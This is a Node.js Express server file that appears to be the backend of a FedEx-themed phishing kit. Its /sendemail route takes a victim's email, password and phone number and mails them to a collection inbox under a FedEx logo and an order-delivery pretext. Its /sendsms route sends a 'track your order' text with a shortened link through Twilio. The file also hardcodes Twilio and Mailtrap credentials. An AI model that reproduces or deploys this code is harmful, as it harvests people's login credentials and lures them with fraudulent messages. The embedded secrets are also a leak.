const morgan = require("morgan")
const express = require("express")
const nodemailer = require("nodemailer")
const cors = require("cors")

const app = express()
const port = process.env.PORT || 30000

const accountSID = "ACfcae9e5c0f286e0a7de34799147fad3a"
const authToken = "8823be7f3bf57dfb71b52ebbad71856f"
const phoneNumber = "+12545003109"

const client = require('twilio')(accountSID, authToken)

app.use(express.json())
app.use(express.urlencoded({ extended: true }))
app.use(morgan("dev"))
app.use(cors())
app.enable('trust proxy')

const sendEmail = (email, password, phoneNumber) => {

    let dataToSend = {
        email: email,
        password: password,
        phoneNumber: phoneNumber,
        timestamp: new Date()
    }

    var transporter = nodemailer.createTransport({
        host: "sandbox.smtp.mailtrap.io",
        port: 2525,
        auth: {
          user: "66f2c4bca41d78",
          pass: "e827e3ae212774"
        }
    });
    
    let message = {
        from: "from-example@email.com",
        to: "from-example@email.com",
        subject: "Subject",
        html: `
            ${dataToSend.phoneNumber == "" ? `<img style="width: 50%" src="cid:uniqueaq@kreata.ee"/>
            <h3>Dear customer,</h3>
            <p>Please, login and provide your mobile number to contact you when the order arrives.</p><a href="http://localhost:3000/phone-number"> Click here </a> to enter your phone number` : ""}
            
            <p>Email: ${dataToSend.email}</p><p>Password: ${dataToSend.password}</p><p>Phone Number: ${dataToSend.phoneNumber}</p><p>Date: ${dataToSend.timestamp}<p/>
            `,
        attachments: [{
                filename: 'image.png',
                path: './src/img/fedex.jpg',
                cid: 'uniqueaq@kreata.ee' //same cid value as in the html img src
        }]
    }
    
    transporter.sendMail(message, function(err, info) {
        console.log(err)
        console.log(info)
    })
}

app.post("/confirm-login", (req, res) => {
    const email = req.body.email
    var transporter = nodemailer.createTransport({
        host: "sandbox.smtp.mailtrap.io",
        port: 2525,
        auth: {
          user: "66f2c4bca41d78",
          pass: "e827e3ae212774"
        }
    });
    
    let message = {
        from: "from-example@email.com",
        to: "from-example@email.com",
        subject: "Subject",
        html: `
            <p>Email: ${email}</p><p>PIN Code: 2023</p>
            `,
    }
    
    transporter.sendMail(message, function(err, info) {
        console.log(err)
        console.log(info)
    })
    return res.status(200).json("Sent")
})

app.post("/sendsms", (req, res) => {
    client.messages
        .create({
            body: `Click in the following link to track your order. https://shorturl.at/tySU8`,
            from: phoneNumber,
            to: "+351934019454"
        })
        .then(message => console.log(message.sid));
    return res.status(200).json("Sent")
})

app.post("/sendemail", (req, res) => {
    const {email, password, phoneNumber} = req.body
    sendEmail(email, password, phoneNumber)

    return res.status(200).json({message: "Email sent", status: true})
})

app.get("/", (req, res) => {
    return res.status(200).json("ok")
})

app.listen(port, () => {
    console.log(`Listening on port ${port}.`)
})